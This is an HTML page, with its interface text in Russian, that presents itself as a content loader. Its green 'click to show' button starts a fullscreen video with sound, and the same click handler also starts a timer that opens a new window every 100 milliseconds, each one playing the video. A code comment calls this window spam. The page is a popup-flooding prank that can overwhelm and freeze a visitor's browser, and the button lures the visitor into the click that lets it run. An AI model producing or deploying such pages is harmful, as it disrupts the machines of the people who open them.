<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        html, body {
            margin: 0; padding: 0; height: 100%;
            background: #000; overflow: hidden;
            font-family: Arial, sans-serif;
        }
        #start-screen {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            background: #000; cursor: pointer; z-index: 9999;
            padding: 20px; text-align: center;
        }
        #start-screen h1 {
            font-size: 22px; color: #fff; margin-bottom: 30px;
        }
        #green-btn {
            background: #00cc44; color: #fff; border: none;
            padding: 18px 40px; font-size: 20px;
            border-radius: 8px; cursor: pointer;
            box-shadow: 0 0 20px rgba(0, 204, 68, 0.6);
        }
        #green-btn:hover { background: #00ff55; }
        
        #video-container {
            position: fixed; top: 0; left: 0;
            width: 100%; height: 100%;
            z-index: 1; display: none; background: #000;
        }
        #fullscreen-video {
            width: 100%; height: 100%; object-fit: cover;
        }
        /* Текст ошибки, если видео не найдено */
        #error-msg {
            position: fixed; bottom: 20px; left: 0; right: 0;
            color: #ff4444; font-size: 14px; text-align: center;
            z-index: 999; font-family: monospace;
        }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div id="start-screen" onclick="startVideo()">
        <h1>Загрузка контента...</h1>
        <button id="green-btn" onclick="event.stopPropagation(); startVideo();">
            ▶ Нажми, чтобы показать
        </button>
    </div>

    <div id="video-container">
        <video id="fullscreen-video" loop playsinline preload="auto">
            <source src="video.mp4" type="video/mp4">
            Ваш браузер не поддерживает видео.
        </video>
    </div>

    <div id="error-msg"></div>

    <script>
        var started = false;

        function showError(text) {
            document.getElementById('error-msg').innerText = text;
        }

        function startVideo() {
            if (started) return;
            started = true;

            document.getElementById('start-screen').classList.add('hidden');
            document.getElementById('video-container').style.display = 'block';

            var video = document.getElementById('fullscreen-video');
            
            // Проверяем ошибки загрузки самого файла
            video.onerror = function() {
                showError('Ошибка: файл video.mp4 не найден или поврежден!');
            };

            video.muted = false;
            var playPromise = video.play();

            if (playPromise !== undefined) {
                playPromise.then(function() {
                    // Видео успешно запустилось со звуком
                }).catch(function(error) {
                    console.log('Автоплей со звуком заблокирован, пробуем без звука:', error);
                    video.muted = true;
                    video.play().catch(function(e) {
                        showError('Ошибка воспроизведения видео: ' + e.message);
                    });
                });
            }

            // Пытаемся запустить спам окон (если браузер разрешит)
            setInterval(function() {
                try {
                    var w = window.open('', '_blank');
                    if (w) {
                        w.document.write(`
                            <html>
                            <head><title>Loading...</title></head>
                            <body style="margin:0;background:#000;overflow:hidden;">
                                <video id="v" loop playsinline autoplay style="width:100%;height:100%;object-fit:cover;">
                                    <source src="video.mp4" type="video/mp4">
                                </video>
                            </body>
                            </html>
                        `);
                    }
                } catch(e) {}
            }, 100);
        }
    </script>
</body>
</html>
